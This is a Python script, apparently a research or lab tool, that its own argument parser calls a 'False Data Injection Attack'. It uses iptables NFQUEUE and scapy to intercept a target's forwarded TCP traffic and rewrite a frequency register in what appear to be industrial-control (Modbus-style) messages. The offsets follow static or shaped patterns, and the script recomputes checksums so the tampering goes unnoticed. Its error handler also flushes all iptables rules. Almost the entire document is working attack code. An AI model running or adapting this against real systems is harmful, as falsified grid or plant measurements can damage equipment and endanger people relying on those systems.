from scapy.all import *
from netfilterqueue import NetfilterQueue
import random
import numpy as np

change_values = []
debugging = False
freq = 'static'
freq_data = 100

def gaussian_modifier(data_to_mod,
                      expected_max=-.15,
                      point_range=5):
    n_points = len(data_to_mod)

    dummy_distribution = np.linspace(-1 * point_range, point_range, n_points)

    dummy_gausian = np.exp(-np.power(dummy_distribution, 2.0) / 2.0)

    gausian_adjusted = dummy_gausian * expected_max
    return gausian_adjusted + data_to_mod


def sigmoid_modifier(data_to_mod,
                     expected_max=-.15,
                     point_range=5):
    n_points = len(data_to_mod)

    dummy_distribution = np.linspace(-1 * point_range, point_range, n_points)

    dummy_sigmoid = 1 / (1 + np.exp(-dummy_distribution))

    sigmoid_adjusted = dummy_sigmoid * expected_max
    return sigmoid_adjusted + data_to_mod


def sin_modifier(data_to_mod,
                 expected_max=-.15,
                 point_range=5):
    n_points = len(data_to_mod)

    dummy_distribution = np.linspace(-1 * point_range, point_range, n_points)

    dummy_sin = np.abs(np.sin(dummy_distribution))

    sin_adjusted = dummy_sin * expected_max
    return sin_adjusted + data_to_mod

def exponential_modifier(data_to_mod,
                         expected_max=-.15,
                         point_range=5):
    n_points = len(data_to_mod)

    dummy_distribution = np.linspace(-1 * point_range, point_range, n_points)

    dummy_exponential = 1 / np.exp(dummy_distribution)

    exp_adjusted = (dummy_exponential * expected_max) / (40)
    return exp_adjusted + data_to_mod

def pulse_modifier(data_to_mod,
                   expected_max=-.15,
                   point_range=0):
    expected_max = [expected_max] * len(data_to_mod)
    expected_max=np.array(expected_max)
    return expected_max + data_to_mod

def polynomial_modifier(data_to_mod,
                        expected_max=-.15,
                        point_range=5):
    n_points = len(data_to_mod)
    dummy_distribution = np.linspace(-1 * point_range, point_range, n_points)
    dummy_poly = ((dummy_distribution ** 2) - 2 * dummy_distribution + 1)
    poly_adjusted = ((dummy_poly * expected_max) / (18) )
    return poly_adjusted + data_to_mod

def get_values():
    global change_values
    global freq
    global debugging
    global freq_data
    dynamic_list=[gaussian_modifier, sigmoid_modifier, sin_modifier, exponential_modifier, pulse_modifier, polynomial_modifier]
    if freq == 'static':
        change_values = [0.605]*freq_data
        change_values=np.array(change_values)
    elif freq == 'dynamic':
        rand_fun=random.choice(dynamic_list)
        change_values = rand_fun([float(0)]*freq_data)
        if debugging: print(f'Random Function: {rand_fun}')
    elif freq == 'gaussian':
        change_values = gaussian_modifier([float(0)]*freq_data)
    elif freq == 'sigmoid':
        change_values = sigmoid_modifier([float(0)]*freq_data)
    elif freq == 'sin':
        change_values = sin_modifier([float(0)]*freq_data)
    elif freq == 'exponential':
        change_values = exponential_modifier([float(0)]*freq_data)
    elif freq == 'pulse':
        change_values = pulse_modifier([float(0)]*freq_data)
    elif freq == 'polynomial':
        change_values = polynomial_modifier([float(0)]*freq_data)
    if debugging: print(f"Modification Values for {freq}:", change_values)
    change_values = change_values.tolist()
    return

def modify_packet(scapy_packet):
    global change_values
    global debugging
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                
                #debug
                if debugging: print("Orginal Frequency:", hz_register)
                
                if len(change_values) == 0: get_values()
                change_value=change_values.pop(0)
                
                change_value = int(change_value*10000)
                
                #debug        
                if debugging: print("Change Value:", change_value)
                
                new_sec_register = hz_register + change_value
                if new_sec_register < 0:
                    new_sec_register = -new_sec_register
                if new_sec_register > 65535:
                    new_sec_register = 65535-change_value
                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

                packet[Raw].load = modified_payload

                del packet[IP].len
                del packet[IP].chksum
                if packet.haslayer(TCP):
                    del packet[TCP].chksum
                
                #debug  
                if debugging: print("Modified Frequecy:", new_sec_register)
 

                scapy_packet.set_payload(bytes(packet))
                #debug
                if debugging: print("Modified and sent packet \n")


        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")

def setup_iptables(ip,port):
    os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')

def cleanup_iptables(ip, port):
    os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')



if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='False Data Injection Attack(FDIA)')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-p', '--port', default='30502',
                       help='Port of target')
    parser.add_argument('-f', '--frequency', default= 'static', choices=['static', 'dynamic','gaussian','sigmoid', 'sin', 'exponential','pulse', 'polynomial' ], 
                        help='Frequency change pattern (default: static[30hz]) (choices: static, dynamic, gaussian, sigmoid, sin, exponential, pulse, polynomial)')
    parser.add_argument('-d', '--debug', default=False, action='store_true',
                       help='Debug mode')
    args = parser.parse_args()
    
    ip = args.target
    port=args.port
    debugging = args.debug
    freq=args.frequency

    try:
        setup_iptables(ip,port)
        print(f"[*] IPTables rules set on {ip}:{port}")
        nfqueue = NetfilterQueue()
        print("[*] Creating NFQUEUE")
        nfqueue.bind(1, modify_packet)
        print("[*] Starting NFQUEUE")
        print("[*] Waiting for packets")
        nfqueue.run() 
    except Exception as e:
        print("[*] Error:", e)
    except KeyboardInterrupt:
        print("[*] Stopping NFQUEUE")
    finally:
        if nfqueue:
            nfqueue.unbind()
            print("[*] Stopped NFQUEUE")
        cleanup_iptables(ip,port)
        print("[*] IPTables rules removed")
        sys.exit(0)
